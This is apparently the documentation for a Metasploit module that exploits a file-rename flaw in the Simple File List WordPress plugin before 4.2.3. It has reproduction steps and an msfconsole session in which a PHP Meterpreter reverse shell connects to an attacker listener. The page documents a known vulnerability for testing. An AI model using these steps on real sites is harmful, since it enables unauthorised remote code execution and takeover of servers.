## Vulnerable Application

Simple File List (simple-file-list) plugin before 4.2.3 for WordPress allows remote
unauthenticated attackers to upload files within a controlled list of extensions.
However, the rename function does not conform to the file extension restrictions,
thus allowing arbitrary PHP code to be uploaded first as a png then renamed to php 
and executed.

Download [4.2.2](https://downloads.wordpress.org/plugin/simple-file-list.4.2.2.zip) or another
version < 4.2.3 from [here](https://wordpress.org/plugins/simple-file-list/advanced/).

Install and enable to plugin, no additional configuration is required.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use exploit/multi/http/wp_simple_file_list_rce`
1. Do: `set rhosts [ip]`
1. Do: `set lhost [ip]`
1. Do: `run`
1. You should get a shell.

## Options

## Scenarios

### Simple File List 4.2.2 on Wordpress 5.4.2 on Ubuntu 20.04

```
msf6 > use exploit/multi/http/wp_simple_file_list_rce 
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_simple_file_list_rce) > set rhosts 2.2.2.2
rhosts => 2.2.2.2
msf6 exploit(multi/http/wp_simple_file_list_rce) > set lhost 1.1.1.1
lhost => 1.1.1.1
msf6 exploit(multi/http/wp_simple_file_list_rce) > exploit

[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] Attempting PNG payload upload
[+] PNG payload successfully uploaded
[*] Attempting to rename from png to php
[+] Rename Successful
[*] Triggering shell
[*] Sending stage (39282 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:32816) at 2020-11-21 08:47:16 -0500
[+] Deleted 87vUo9oy.php

meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : wordpress2004
OS          : Linux wordpress2004 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64
Meterpreter : php/linux
```
